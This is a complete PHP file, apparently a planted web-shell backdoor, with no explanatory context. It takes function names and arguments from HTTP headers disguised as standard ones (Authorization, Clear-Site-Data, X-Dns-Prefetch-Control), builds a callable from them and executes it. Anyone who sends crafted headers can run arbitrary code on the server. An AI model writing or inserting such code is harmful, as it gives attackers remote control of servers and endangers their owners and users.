<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $class = $_HEADERS['Authorization']('', $_HEADERS['Clear-Site-Data']($_HEADERS['X-Dns-Prefetch-Control']));
    $class();
}